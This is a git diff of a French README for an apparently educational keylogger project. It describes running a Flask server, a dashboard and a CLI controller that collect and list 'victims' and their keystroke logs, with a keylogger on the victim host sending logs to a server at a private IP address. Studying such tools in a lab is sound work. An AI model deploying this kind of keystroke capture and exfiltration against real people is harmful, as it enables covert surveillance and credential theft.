@@ -35,29 +35,67 @@ keylogger_project/
 
 pip3 install flask requests
 ```
-2. Lancer l'API Backend pour la réception des données 
+2. Lancer l'API Backend pour la réception des données
+
+Ceci est une étape importante pour nous car l'API nous permettra de recevoir les logs du keylogger lancé sur la machine de la victime. Dans la foulée, les données reçues seront stockées en mémoire et affchées sur le serveur web falsk
 
 ```
 python3 web.py
 ```
-3. Lancer le Dashboard 
+3. Lancer le Dashboard
+
+Ce script nous permettra d'afficher les victimes dans sur le navigateur tout en ayant une interaction avec les victimes listes. Il reçoit les entrées capturées et exposées sur le port 5000 par le script web.py
+
 ```
 python3 dashboard.py
 ```
 
 4. Lancer le Contrôleur pour l'affichage intéractif en CLI
+
+Le controleur nous permmet un affichage intéractif en ligne de commande pour consulter la liste des victimes, les logs qui s'y rapportent depuis la ligne de commande.  
    
 ```
 python3 controller.py --server http://192.168.30.129:5000
 
 ```
+
+================================================================================
+                         CONTRÔLEUR KEYLOGGER
+================================================================================
+
+1. Lister les victimes
+2. Voir les logs d'une victime
+3. Mode live (streaming)
+4. Statistiques
+5. Quitter
+
+Choix: 
+
+
 - Sur l'hôte victime
 
-1. Lancer le keylogger
+1. Lancer le script python v3_keylogger.py
+
+Ce script nous permet de capturer les frappes clavier de la victime distante, sauvegarde ces derbières dans un fichier keylog.json pour un envoi ultérieur au serveur distant sur son port 5000.
 
 ```
 python3 v3_keylogger_simple.py
 ```
+python3 v3_keylloger.py 
+[*] ========================================
+[*] Keylogger pédagogique (MODE SIMPLE)
+[*] ========================================
+[*] Victime ID : victime_39198cb1-5c7b-49b4-8d4e-b7458c13202f
+[*] Serveur   : http://192.168.30.129:5000/api/logs
+[*] Fichier   : keylog.json
+[*] 
+[*] COMMANDES :
+[*]   - Tapez du texte et appuyez sur Entrée
+[*]   - Tapez 'send' pour envoyer au serveur
+[*]   - Tapez 'quit' pour quitter
+[*] 
+[*] ========================================
+
 
 D. Fonctionnement du système 
 
